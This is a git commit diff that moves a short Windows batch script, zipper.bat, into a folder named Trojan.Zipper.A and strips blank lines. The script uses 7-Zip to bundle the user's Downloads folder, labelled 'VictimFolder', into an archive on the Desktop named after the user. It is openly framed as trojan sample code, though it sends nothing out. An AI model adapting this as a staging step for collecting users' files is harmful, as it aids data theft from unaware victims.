b84d27aa14780e4ee1857b5704e3744d14fe9296
Windowszin <125829699+Windowszin@users.noreply.github.com>
2023-07-15 14:17:26 -0300

    Update and rename zipper.bat to Trojan.Zipper.A/zipper.bat

--- Trojan.Zipper.A/zipper.bat
+++ Trojan.Zipper.A/zipper.bat
@@ -1,13 +1,6 @@
 @echo off
-
 set "Desktop=%USERPROFILE%\Desktop"
-
 set "VictimFolder=%USERPROFILE%\Downloads"
-
-
 echo (7zip) Zipping files...
-
 7z a "%Desktop%\%USERNAME%Files.zip" "%VictimFolder%\*"
-
 echo Zip file created successfully!
-
